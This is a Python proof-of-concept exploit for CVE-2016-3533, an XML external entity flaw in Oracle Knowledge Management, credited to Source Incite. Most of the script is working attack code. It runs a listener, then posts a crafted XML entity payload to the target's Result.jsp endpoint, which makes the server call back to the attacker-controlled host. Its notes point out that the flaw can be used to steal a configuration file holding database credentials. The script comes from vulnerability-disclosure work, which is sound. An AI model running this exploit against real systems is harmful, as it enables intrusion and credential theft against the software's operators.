#!/usr/local/bin/python
"""
Oracle Knowledge Management Castor Library XML External Entity Injection Information Disclosure Vulnerability
Found by: Steven Seeley of Source Incite
CVE: CVE-2016-3533
SRC: SRC-2016-0023
Notes:
- You can steal the C:/Oracle/Knowledge/IM/instances/InfoManager/custom.xml file via the XXE bug which contains the db user/pass
- This PoC simply performs an Out-of-Band request

Example:
========

saturn:oracle-knowledge mr_me$ ./poc.py 
(+) usage: ./poc.py <target> <xxe server>
(+) eg: ./poc.py 172.16.175.137 172.16.175.1 nwv25cerqtsxg42qhayn5trb
saturn:oracle-knowledge mr_me$ ./poc.py 172.16.175.137 172.16.175.1
(+) starting xxe server...
(+) launching xxe attack...
(!) triggered xxe attack!
"""

from BaseHTTPServer import HTTPServer, BaseHTTPRequestHandler

from SocketServer import ThreadingMixIn
import threading
import sys
import time
import requests

# stfu
requests.packages.urllib3.disable_warnings()

class xxe(BaseHTTPRequestHandler):

    # stfu
    def log_message(self, format, *args):
        return

    def do_GET(self):
        # if we land here, the target is vuln
        print "(!) triggered xxe attack!"
        self.send_response(200)
        self.end_headers()
        message =  threading.currentThread().getName()
        self.wfile.write(message)
        self.wfile.write('\n')
        return

if __name__ == '__main__':

    if len(sys.argv) != 3:
        print "(+) usage: %s <target> <xxe server>" % sys.argv[0]
        print "(+) eg: %s 172.16.175.137 172.16.175.1" % sys.argv[0]
        sys.exit(1)

    t = sys.argv[1]
    x = sys.argv[2]

    try:
        server = HTTPServer(('0.0.0.0', 9090), xxe)
        print '(+) starting xxe server...'
        
        # we just handle a single request in a thread so we can make the remote xxe attack
        http = threading.Thread(target=server.handle_request).start()
        print "(+) launching xxe attack..."

        # setup our oob xxe attack
        xml  = "<?xml version=\"1.0\" encoding=\"utf-8\"?>"
        xml += "<!DOCTYPE root [<!ENTITY %% xxe SYSTEM \"http://%s:9090/\"> %%xxe;]>" % x

        # data & headers
        h = {'content-type': 'application/x-www-form-urlencoded'}
        d = {'method' : '2', 'inputXml': xml }

        url = "http://%s:8226/imws/Result.jsp" % t

        # fire, and if we hit our webserver, the target is vuln ;-)
        requests.post(url, headers=h, data=d)

    except KeyboardInterrupt:
        print '(+) shutting down the web server'
        server.socket.close()
